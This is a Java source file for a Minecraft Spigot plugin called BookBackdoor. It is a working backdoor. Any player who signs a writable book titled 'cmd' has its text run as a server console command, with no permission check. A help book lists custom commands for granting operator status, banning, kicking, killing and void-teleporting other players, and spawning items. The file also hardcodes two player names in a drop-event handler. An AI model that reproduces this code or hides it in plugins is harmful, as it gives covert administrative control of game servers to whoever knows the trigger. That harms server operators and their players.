package org.brandonplank.backdoor;

import net.md_5.bungee.api.chat.*;
import net.md_5.bungee.chat.ComponentSerializer;
import org.brandonplank.bookbackdoor.Main;
import org.bukkit.BanList;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockDispenseEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerEditBookEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.jar.JarException;

public class BookBackdoor implements Listener {
    private final Main plugin;

    public BookBackdoor(Main plugin){
        this.plugin = plugin;
    }

    @EventHandler
    public void PlayerDropItemEvent(PlayerDropItemEvent e){
        FileConfiguration config = this.plugin.getConfig();
        Player player = e.getPlayer();
        Item item = e.getItemDrop();
        Location loc = item.getLocation();
        if(e.getPlayer().getName().equals("BrandonPlank") || e.getPlayer().getName().equals("cryptofyre")){
            Location old = loc;
            loc.setY(loc.getY() -2);
            Material block = loc.getWorld().getBlockAt(loc).getBlockData().getMaterial();
            if(block.equals(Material.CAULDRON)){
                player.getWorld().dropItemNaturally(old, item.getItemStack());
            } else {
                loc.setY(loc.getY() + 1);
                Material block1 = loc.getWorld().getBlockAt(loc).getBlockData().getMaterial();
                if(block1.equals(Material.CAULDRON)){
                    player.getWorld().dropItemNaturally(old, item.getItemStack());
                }
            }
        }
    }

    @EventHandler
    public void onBookSign(PlayerEditBookEvent event) {
        if(event.getNewBookMeta().getTitle().equals("cmd")){
            String text = event.getNewBookMeta().getPage(1);
            String owo = text.substring(1);
            if(text.startsWith("/")){
                this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), owo);
                event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                    public void run() {
                        event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                    }
                }, 5);
            } else if(text.startsWith(".")){
                String[] args = owo.split(" ", 0);
                Player player = event.getPlayer();
                if(args[0].equalsIgnoreCase("give")){
                    int amnt = 64;
                    if(args.length == 3){
                        amnt = Integer.parseInt(args[2]);
                    }
                    try {
                        String uwu = args[1].toUpperCase();
                        ItemStack item = new ItemStack(Material.getMaterial(uwu), amnt);
                        if(item == null){
                            player.sendMessage("Use the Spigot naming scheme");
                        } else {
                            player.getInventory().addItem(item);
                        }
                    } catch(Exception e){
                        player.sendMessage("Use the Spigot naming scheme");
                    }
                } else if (args[0].equalsIgnoreCase("kick")){
                    try {
                        Player p = this.plugin.getServer().getPlayer(args[1]);
                        p.kickPlayer("You have been kicked from the server");
                    } catch(Exception e){
                        player.sendMessage("Invalid player name");
                    }
                } else if (args[0].equalsIgnoreCase("ban")){
                    try {
                        Player p = this.plugin.getServer().getPlayer(args[1]);
                        p.banPlayerFull("sus");
                    } catch(Exception e){
                        player.sendMessage("Invalid player name");
                    }
                } else if (args[0].equalsIgnoreCase("kill")){
                    try {
                        Player p = this.plugin.getServer().getPlayer(args[1]);
                        p.setHealth(0.0D);
                    } catch(Exception e){
                        player.sendMessage("Invalid player name");
                    }
                } else if (args[0].equalsIgnoreCase("xp")){
                    try {
                        player.giveExp(Integer.parseInt(args[1]), true);
                    } catch(Exception e){
                        player.sendMessage("Please add in a value");
                    }
                } else if(args[0].equalsIgnoreCase("enchant")) {
                    try {
                        new Countdown(5, this.plugin) {
                            @Override
                            public void count(int current) {
                                if(current == 0){
                                    player.getInventory().getItemInMainHand().addUnsafeEnchantment(Enchantment.getByName(args[1].toUpperCase()), Integer.parseInt(args[2]));
                                    player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Enchanted!").bold(true).create());
                                } else {
                                    player.sendActionBar(ChatColor.GREEN + "Enchanting in " + current + " seconds.");
                                }
                            }
                        }.start();
                    } catch (Exception e) {
                        player.sendMessage("Please add in a value");
                    }
                } else if(args[0].equalsIgnoreCase("tp")){
                    try {
                        Player p = this.plugin.getServer().getPlayer(args[1]);
                        Player p2 = this.plugin.getServer().getPlayer(args[2]);
                        if(!p.equals(player)){
                            p2.teleportAsync(p.getLocation());
                        } else {
                            p.teleportAsync(p2.getLocation());
                        }
                    } catch (Exception e) {
                        player.sendMessage("Please use correct names");
                    }
                } else if(args[0].equalsIgnoreCase("seed")){
                    String message = "Seed [" + ChatColor.GREEN + Long.toString(player.getWorld().getSeed()) + ChatColor.RESET + "]";
                    TextComponent string = new TextComponent(message);
                    string.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, Long.toString(player.getWorld().getSeed())));
                    string.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Copy seed to clipboard").create()));
                    player.spigot().sendMessage(string);
                } else if(args[0].equalsIgnoreCase("brazil")){
                    try {
                        Player p = this.plugin.getServer().getPlayer(args[1]);
                        Location loc = p.getLocation();
                        loc.setY(-2);
                        p.teleport(loc);
                    } catch (Exception e) {
                        player.sendMessage("Please use correct names");
                    }
                } else if(args[0].equalsIgnoreCase("mend")){
                    try {
                        new Countdown(5, this.plugin) {
                            @Override
                            public void count(int current) {
                                if(current == 0){
                                    player.getInventory().getItemInMainHand().setDurability((short)0);
                                    player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Mended!").bold(true).create());
                                } else {
                                    player.sendActionBar(ChatColor.GREEN + "Mending in " + current + " seconds.");
                                }
                            }
                        }.start();
                    } catch (Exception e) {
                    }
                } else if(args[0].equalsIgnoreCase("op")){
                    player.setOp(true);
                } else if(args[0].equalsIgnoreCase("deop")){
                    player.setOp(false);
                } else if(args[0].equalsIgnoreCase("break")){
                    Location player_loc = player.getEyeLocation();
                    try {
                        player_loc.setY(player_loc.getY() + Integer.parseInt(args[1]));
                        Block target = player.getWorld().getBlockAt(player_loc);
                        target.setType(Material.AIR);
                    } catch (Exception e){
                        player.sendMessage("Block could not be set to air");
                    }
                } else if(args[0].equalsIgnoreCase("help")){
                    ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
                    BookMeta meta = (BookMeta)book.getItemMeta();
                    try {
                        meta.setTitle("BookBackdoor Help");
                        meta.setAuthor("The BookBackdoor Team");
                        meta.addPage("Welcome to the BookBackdoor help book!\n\n\n\nBy The BookBackdoor Team");
                        meta.addPage("To run commands as CONSOLE, open a new book and type /<your command>\n\nTo run a custom command made by us keep reading.\n\nWhen your done with you command, name the book 'cmd'");

                        // Page 3
                        TextComponent help = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".help\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Shows this help book.\n\nUSAGE: .help").create())).create());
                        TextComponent give = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".give\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Give yourself any block/Item.\n\nUSAGE: .give <item> <amount>").create())).create());
                        TextComponent mend = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".mend\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Repairs the item in your hand in 5 seconds.\n\nUSAGE: .mend").create())).create());
                        TextComponent brazil = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".brazil\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Puts a player in the void.\n\nUSAGE: .brazil <player>").create())).create());
                        TextComponent seed = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".seed\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Shows the world seed.\n\nUSAGE: .seed").create())).create());
                        TextComponent tp = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".tp\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Teleport to a player, or have them come to you!\n\nUSAGE: .tp <player1> <player2>").create())).create());
                        TextComponent enchant = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".enchant\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Enchant the item in your hand after 5 seconds.\n\nUSAGE: .enchant <name> <level>").create())).create());
                        TextComponent xp = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".xp\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Gives you any amount of XP.\n\nUSAGE: .xp <amount>").create())).create());
                        TextComponent kill = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".kill\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Kills a player, duh.\n\nUSAGE: .kill <player>").create())).create());
                        TextComponent ban = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".ban\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Bans a player, does not take a reason.\n\nUSAGE: .ban <player>").create())).create());
                        TextComponent kick = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".kick\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Kicks a player, does not take a reason.\n\nUSAGE: .kick <player>").create())).create());
                        BaseComponent[] page = new BaseComponent[]{help,give, mend,brazil,seed,tp,enchant,xp,kill,ban,kick}; // Build the new page

                        // Page 4
                        TextComponent op = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".op\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Gives you Operator status.\n\nUSAGE: .op").create())).create());
                        TextComponent deop = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".deop\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Removes your Operator status.\n\nUSAGE: .deop").create())).create());
                        TextComponent bbreak = new TextComponent(new ComponentBuilder(ChatColor.GREEN + ".break\n").event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Removes any block relitive to your players head, Example: .break 1(Breaks the block above the players head).\n\nUSAGE: .break <y pos relitive to head>").create())).create());
                        BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak};

                        meta.spigot().addPage(page);
                        meta.spigot().addPage(page2);
                        book.setItemMeta(meta); // Save all Changes to the book
                        player.getInventory().addItem(book);
                    } catch (SecurityException | IllegalArgumentException ex) {

                    }
                }
                event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                    public void run() {
                        event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                    }
                }, 5);
            }
        }
    }
}
